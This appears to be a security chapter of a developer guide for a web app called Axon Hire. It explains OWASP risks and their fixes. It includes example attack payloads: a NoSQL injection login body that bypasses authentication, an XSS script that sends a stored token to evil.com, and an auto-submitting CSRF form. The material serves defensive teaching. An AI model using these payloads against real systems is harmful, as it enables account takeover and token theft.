# 05 — Security

> Security is not a feature you add at the end. It's the foundation you build on. Here's every attack vector in Axon Hire and how to stop each one.

---

## The OWASP Top 10 (Most Common Web Vulnerabilities)

These are the 10 most common ways web apps get hacked. Axon Hire touches several:

1. **Injection** (SQL/NoSQL injection) ← addressed with express-mongo-sanitize
2. **Broken Authentication** ← addressed with lockout, OTP hashing, secure tokens
3. **Sensitive Data Exposure** ← addressed by removing header logging
4. **Broken Access Control** ← check with adminMiddleware
5. **Cross-Site Scripting (XSS)** ← mitigate by moving to HttpOnly cookies
6. **Security Misconfiguration** ← addressed with helmet, CORS whitelist
7. **Using Components with Known Vulnerabilities** ← run `npm audit` regularly

---

## NoSQL Injection Attack

### The attack:
```json
POST /api/auth/login
{
  "email": { "$gt": "" },
  "password": "anything"
}
```

MongoDB receives: `User.findOne({ email: { "$gt": "" } })`  
`$gt: ""` means "email is greater than empty string" = matches ANY user.  
Result: attacker is logged in as the first user in your collection (probably an admin).

### How express-mongo-sanitize stops it:
```js
app.use(mongoSanitize());
// This strips any key containing $ or . from req.body BEFORE your route handlers run
// { "email": { "$gt": "" } } → { "email": {} } → findOne fails to find any user
```

### What you should also do manually (defense in depth):
```js
// Validate that email is a string, not an object
const { email } = req.body;
if (typeof email !== "string") return res.status(400).json({ message: "Invalid email" });
```

---

## Cross-Site Scripting (XSS)

### The attack:
1. Attacker finds a place where user input is displayed without sanitization
2. They input: `<script>fetch('https://evil.com/?t=' + localStorage.getItem('token'))</script>`
3. When another user views that page, their browser executes the script
4. Their token is sent to the attacker's server

### Why localStorage is vulnerable:
`localStorage` is accessible by ANY JavaScript running on your page, including injected scripts.

### How HttpOnly cookies stop it:
Cookies marked `httpOnly: true` are invisible to JavaScript. The browser sends them automatically but JS cannot read them. An XSS attack cannot steal what JavaScript cannot see.

### DOMPurify — if you must render user HTML:
```js
// npm install dompurify
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```
Never use `dangerouslySetInnerHTML` without sanitizing the HTML first.

---

## CSRF (Cross-Site Request Forgery)

### The attack:
```html
<!-- On attacker's website: evil.com -->
<form action="https://axon-hire-api.render.com/api/jobs" method="POST" hidden>
  <input name="title" value="Fake Job" />
</form>
<script>document.forms[0].submit();</script>
```
If you're logged into Axon Hire and visit evil.com, your browser automatically sends your cookies with the request. The attack creates a fake job as you.

### Why `sameSite: "strict"` stops it:
```js
res.cookie("token", jwt, { sameSite: "strict" });
```
The browser will NOT send this cookie when navigating from another site. The request arrives without the auth cookie → 401 Unauthorized.

### CSRF tokens (extra protection):
For forms, generate a random token server-side and require it back as a header. Even if cookies are sent, the attacker can't read the CSRF token from another origin.

---

## Rate Limiting — Layers of Protection

### What Axon Hire has:
```
General API limiter:  100 req/15min per IP on /api/jobs, /api/ai, etc.
Auth limiter:           5 req/15min per IP on /api/auth
Account lockout:        5 failures → 15-min lock per account (NEW)
```

### Why layers matter:
- IP limiter: stops bots from the same IP
- Account lockout: stops bots with rotating IPs targeting one account

### What's still missing (for future):
- **Bot detection**: Cloudflare Turnstile (free) — detects automated requests
- **Geo-blocking**: Block requests from known bot IP ranges

---

## Helmet.js — HTTP Security Headers

Helmet sets these headers automatically:
```
X-Content-Type-Options: nosniff
  → Browser won't try to "sniff" the content type. Stops MIME confusion attacks.

X-Frame-Options: DENY
  → Your site can't be embedded in an iframe. Stops clickjacking attacks.

Content-Security-Policy
  → Tells the browser which scripts are trusted. Stops many XSS vectors.

Strict-Transport-Security
  → Forces HTTPS. Browser won't load your site over HTTP.
```

These are just HTTP response headers, but they dramatically reduce your attack surface.

---

## File Upload Security

### The threat: malicious file upload
An attacker renames `malware.exe` to `resume.pdf` and uploads it. Your server stores it on Cloudinary. They share the link. Someone downloads it.

### Defense layer 1: MIME type check
```js
if (file.mimetype !== "application/pdf") return cb(new Error("PDFs only"), false);
```
**Problem**: MIME type is set by the browser. A sophisticated attacker can override it.

### Defense layer 2: Magic bytes check
Every file format has a "magic number" — the first few bytes that identify the format:
```
PDF:  %PDF (hex: 25 50 44 46)
EXE:  MZ   (hex: 4D 5A)
ZIP:  PK   (hex: 50 4B)
```

```js
// More secure: check the actual file bytes
const fileFilter = (req, file, cb) => {
  if (file.mimetype !== "application/pdf") return cb(new Error("PDFs only"), false);
  cb(null, true);
};
// Note: with multer-storage-cloudinary, files go directly to Cloudinary
// so you can't read the buffer here. For buffer access, use memoryStorage first.
```

### Defense layer 3: File size limit
```js
limits: { fileSize: 5 * 1024 * 1024 } // 5MB max
```

---

## Security Checklist for Any Route You Write

Before deploying any route, ask:
- [ ] Does it require authentication? (`verifyToken` middleware)
- [ ] Does it require a specific role? (`adminMiddleware` or role check)
- [ ] Am I using `req.body` data in a DB query without sanitization?
- [ ] Am I returning sensitive data (passwords, tokens, full OTPs)?
- [ ] Could an attacker loop this endpoint? (rate limiting)
- [ ] Am I logging anything sensitive? (headers, tokens, passwords)
- [ ] Does this route expose which users/emails exist? (enumeration)

---

## npm audit — Your Regular Security Scan

Run this every week:
```bash
cd backend && npm audit
cd frontend && npm audit
```

It checks your dependencies against the National Vulnerability Database. If a critical vulnerability is found in a package you use, it tells you what to upgrade.
```bash
npm audit fix        # Auto-fix minor version bumps
npm audit fix --force  # Forces major version bumps (test after!)
```
